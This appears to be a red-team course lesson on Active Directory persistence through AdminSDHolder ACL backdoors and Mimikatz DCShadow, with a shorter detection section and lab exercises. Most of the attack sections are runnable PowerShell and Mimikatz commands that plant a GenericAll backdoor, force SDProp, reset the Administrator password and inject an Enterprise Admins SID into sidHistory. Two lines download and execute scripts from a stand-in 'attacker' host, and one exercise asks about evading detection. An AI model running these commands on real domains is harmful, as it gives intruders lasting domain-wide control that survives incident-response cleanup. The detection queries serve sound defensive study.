---
title: "AdminSDHolder Backdoor and DCShadow — Persistence at Domain Level"
tags: [red-team, AdminSDHolder, DCShadow, persistence, domain-persistence, Mimikatz,
  SDProp, ATT&CK, T1098, T1207]
module: 08-RedTeam-03
day: 517
related_topics:
  - SID History Trust Attacks (Day 516)
  - Living-Off-The-Land in AD (Day 518)
  - Domain Dominance (Day 499)
  - Post-Exploitation Advanced (Day 497)
---

# Day 517 — AdminSDHolder Backdoor and DCShadow

> "When you have DA, your first thought should be: how do I keep it?
> Not as a file — as a structural modification to Active Directory itself.
> AdminSDHolder and DCShadow are two mechanisms that make your persistence
> a part of the AD design. SDProp enforces AdminSDHolder every 60 minutes.
> DCShadow pushes changes that look like they came from a Domain Controller.
> Both are invisible to most IR teams until they know to look."
>
> — Ghost

---

## Goals

Understand AdminSDHolder and the SDProp mechanism.
Use AdminSDHolder to plant a persistent backdoor that survives ACL cleanup.
Understand DCShadow: pushing AD changes that appear to originate from a DC.
Execute both techniques and understand their detection signatures.

**Prerequisites:** Day 499 (domain dominance), Day 516 (trust attacks),
Domain Admin-level access to the lab.
**Time budget:** 4 hours.

---

## Part 1 — AdminSDHolder: The 60-Minute Enforcer

### What AdminSDHolder Is

```
AdminSDHolder is a special container in Active Directory:
  Distinguished Name: CN=AdminSDHolder,CN=System,DC=corp,DC=local

It holds a security descriptor (ACL) that acts as a template.

SDProp (Security Descriptor Propagator) is a background process that runs
on the PDC Emulator every 60 minutes (default). It:
  1. Finds all accounts in "protected groups" (Domain Admins, Administrators,
     Schema Admins, Enterprise Admins, Account Operators, etc.)
  2. Compares each account's ACL to the AdminSDHolder ACL
  3. Overwrites the account's ACL with the AdminSDHolder ACL if they differ

Purpose:
  Prevent privilege escalation via ACL modification on privileged accounts.
  Even if an admin accidentally grants someone rights on a DA account,
  SDProp resets it within 60 minutes.

Abuse:
  If you add an entry to the AdminSDHolder ACL (requires DA rights),
  SDProp will propagate that entry to ALL protected accounts within 60 minutes.
  And it will re-propagate it every 60 minutes — even after IR cleanup
  removes it from individual accounts.
```

### Protected Groups (SDProp Applies To Their Members)

```
Built-in groups protected by AdminSDHolder (partial list):
  Administrators
  Domain Admins
  Enterprise Admins
  Schema Admins
  Account Operators
  Backup Operators
  Server Operators
  Print Operators
  Group Policy Creator Owners
  Replicator

Members of these groups have their ACL overwritten by AdminSDHolder ACL every 60 min.
```

---

## Part 2 — Planting an AdminSDHolder Backdoor

```powershell
# Requires: Domain Admin access
# Goal: add our backdoor account (jsmith) to the AdminSDHolder ACL
# SDProp will then give jsmith Full Control over all DA accounts within 60 min

# Method 1: PowerView
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" \
    -PrincipalIdentity jsmith \
    -Rights All \
    -Verbose
# → Adds GenericAll for jsmith to the AdminSDHolder object

# Method 2: Direct ADSI manipulation:
$adminSdHolder = [ADSI]"LDAP://CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    (New-Object System.Security.Principal.SecurityIdentifier(
        (Get-ADUser jsmith).SID
    )),
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$adminSdHolder.ObjectSecurity.AddAccessRule($ace)
$adminSdHolder.CommitChanges()
```

### Force SDProp to Run Immediately

```powershell
# Default: SDProp runs every 60 minutes
# Force immediate run (for lab demonstration):

# Method 1: Trigger SDProp via LDAP attribute:
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("runProtectAdminGroupsTask", 1)
$rootDSE.SetInfo()

# Method 2: Invoke-SDPropagator tool:
Invoke-Expression (New-Object Net.WebClient).DownloadString(
    'http://attacker/Invoke-SDPropagator.ps1'
)
Invoke-SDPropagator -showProgress -timeoutMinutes 1

# After SDProp runs:
# jsmith now has GenericAll on every Domain Admin account
# → Can change DA passwords, add to groups, modify ACLs on any DA account
```

### Verify the Backdoor

```powershell
# Check that jsmith now has GenericAll on the Administrator account:
Get-DomainObjectAcl -Identity Administrator -ResolveGUIDs |
    Where-Object { $_.IdentityReferenceName -eq "jsmith" }
# → GenericAll rights visible

# Use the backdoor: set Administrator's password from jsmith's session:
Set-DomainUserPassword -Identity Administrator -AccountPassword (
    ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force
) -Credential (Get-Credential -UserName "corp\jsmith" -Message "Enter jsmith creds")

# Or: add jsmith to Domain Admins directly:
Add-DomainGroupMember -Identity "Domain Admins" -Members jsmith
# → Works because jsmith has GenericAll on domain admin accounts
```

### Persistence Value

```
Even if IR team:
  → Removes jsmith from any admin groups ✓
  → Resets all admin passwords ✓
  → Removes jsmith's ACL from individual admin accounts ✓

SDProp will:
  → Re-propagate GenericAll for jsmith to ALL admin accounts at the next 60-min tick ✗

The only way to remove this backdoor:
  Remove jsmith's ACE from the AdminSDHolder object directly
  Most IR teams do not know to check AdminSDHolder ACLs
```

---

## Part 3 — DCShadow

### What DCShadow Is

DCShadow (Mimikatz) temporarily registers a rogue Domain Controller in AD,
pushes arbitrary changes through the replication protocol, and then deregisters.
The changes appear to have originated from a legitimate DC.

```
Normal AD replication:
  DC1 makes a change → replicates to DC2 via MS-DRSR protocol
  → Logged as: replication from DC1

DCShadow:
  Mimikatz registers ATTACKER_HOST as a temporary "DC" in AD
  Pushes changes directly through MS-DRSR replication
  → Logged as: replication from ATTACKER_HOST (looks like a DC change)
  Deregisters immediately after

Changes that can be pushed via DCShadow:
  → Set SID History on any account (add EA SID = instant DA equivalent)
  → Clear the password history (remove security requirement)
  → Modify primaryGroupID (make a user appear as a Domain Admin without group membership)
  → Set adminCount=1 on an account (SDProp will then protect it)
  → Modify msDS-AllowedToDelegateTo (add constrained delegation silently)
```

### DCShadow Requirements

```
Requirements:
  → Two sessions on the machine (Mimikatz requires two parallel instances)
  → SYSTEM privileges (or DA)
  → Machine must have network access to the DC
  → The registering machine needs replication traffic allowed through the firewall

Limitations:
  → Changes are pushed; not pulled. They replicate to all DCs.
  → After deregistration: the rogue DC entry disappears from AD
  → The changes themselves persist (SID history added, delegation set)
```

### Executing DCShadow

```bash
# Requires two separate Mimikatz instances running simultaneously:

# Terminal 1 (main Mimikatz session — as SYSTEM):
mimikatz "lsadump::dcshadow /object:jsmith /attribute:sidHistory \
          /value:S-1-5-21-ROOT_SID-519"
# → Prepares the change (Enterprise Admins SID added to jsmith)

# Terminal 2 (push the change — as DA):
mimikatz "lsadump::dcshadow /push"
# → Registers as a DC, pushes the SID History change, deregisters

# After DCShadow push:
# → jsmith now has Enterprise Admins SID in their SID history
# → Next time jsmith authenticates, the EA SID is in the PAC
# → jsmith has EA-equivalent rights without being in the EA group
```

---

## Part 4 — Detection

### AdminSDHolder Detection

```
Event 5136: Directory Service Object Modified
  Object: CN=AdminSDHolder,CN=System,DC=corp,DC=local
  AttributeLDAPDisplayName: nTSecurityDescriptor (ACL modification)
  SubjectUserName: jsmith (non-admin modifying AdminSDHolder)

Alert: Any modification to AdminSDHolder's security descriptor
by an account that is not SYSTEM or a documented privileged admin.

Regular audit query (PowerShell):
  Get-DomainObjectAcl -Identity AdminSDHolder -ResolveGUIDs |
    Where-Object { $_.IdentityReferenceName -notin
      @("Administrators","Domain Admins","Enterprise Admins","SYSTEM") }
  → Any unexpected entry is a backdoor
```

### DCShadow Detection

```
DCShadow registers a rogue DC in AD. This creates several events:

Event 4742: Computer account changed
  ComputerName: ATTACKER_HOST (becoming a temporary DC)
  Attributes: serverReference, msDS-Behavior-Version (DC attributes added)

Event 4662: Object access on CN=Sites,CN=Configuration,...
  (The rogue DC registers itself in the AD Sites container)

SIEM correlation:
  A computer account that gains DC-class attributes
  (msDS-Behavior-Version, serverReference, etc.)
  followed by a short window of replication traffic
  followed by removal of those attributes
  → DCShadow temporal pattern

MDI detection:
  "Suspected DCSync attack" — MDI flags non-DC replication sources
  "Rogue domain controller" alert — MDI-specific for DCShadow
```

---

## Key Takeaways

1. AdminSDHolder persistence survives most IR cleanup procedures because IR
   teams focus on group memberships and account passwords — not the
   AdminSDHolder ACL itself. A quarterly review of AdminSDHolder permissions
   is required to detect and remove these backdoors.
2. SDProp is not malicious — it is a security feature. The attack inverts its
   purpose: instead of protecting privileged accounts from ACL changes, SDProp
   becomes the mechanism that re-applies the attacker's ACE every 60 minutes.
3. DCShadow pushes changes that appear to come from a legitimate DC. Standard
   audit logs show the originating DC name — not the actual attacker machine.
   Detection requires checking for computer accounts that temporarily gained
   DC-class attributes.
4. The most dangerous combination: DCShadow to add SID History (Enterprise
   Admins SID) to a low-privilege account. The account is not in any admin
   group; its group membership is clean. Only the sIDHistory attribute reveals
   the persistence.
5. Both techniques require Domain Admin to install. They are post-compromise
   persistence mechanisms — the goal is to survive DA credential rotation
   and IR cleanup. Plan them as part of a full engagement's persistence phase.

---

## Exercises

1. Add jsmith to the AdminSDHolder ACL using PowerView `Add-DomainObjectAcl`.
   Force SDProp to run. Verify that jsmith now has GenericAll on the
   Administrator account. Use that right to change the Administrator password.
2. Attempt IR cleanup: remove jsmith's ACE from the Administrator account
   (not from AdminSDHolder). Wait 65 minutes (or force SDProp). Verify the
   ACE has returned. Record what an IR team must do to permanently remove
   this backdoor.
3. Write an audit PowerShell script that checks the AdminSDHolder ACL and
   alerts on any entry not in a whitelist of expected principals. Schedule
   it to run as a weekly check.
4. Research DCShadow detection in Microsoft Defender for Identity. What
   specific event or pattern does MDI use to detect DCShadow? Can it be
   evaded by reducing the dwell time of the rogue DC registration?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q517.1, Q517.2 …).

---

## Navigation

← Previous: [Day 516 — SID History and Inter-Forest Trust Attacks](DAY-0516-SID-History-Trust-Attacks.md)
→ Next: [Day 518 — Living-Off-The-Land in AD](DAY-0518-LOLAD-Living-Off-The-Land.md)
